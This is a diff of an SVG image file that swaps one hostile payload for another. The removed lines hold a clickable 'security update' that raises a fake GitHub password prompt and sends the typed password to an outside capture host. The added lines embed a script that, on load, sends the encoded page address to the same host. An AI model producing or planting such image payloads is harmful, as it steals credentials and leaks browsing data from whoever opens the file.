@@ -1,6 +1,5 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
-  <a href="javascript:var p=prompt('Your GitHub session has expired. Please re-enter your password to continue:'); if(p) fetch('https://aksjwuwu.free.beeceptor.com/?password='+encodeURIComponent(p));">
-    <rect width="100%" height="100%" fill="white"/>
-    <text x="50" y="50" font-family="Arial" font-size="20" fill="red">⚠️ Security Update: Click to verify your account</text>
-  </a>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    fetch('https://aksjwuwu.free.beeceptor.com/?pwned=' + btoa(document.location.href));
+  </script>
 </svg>
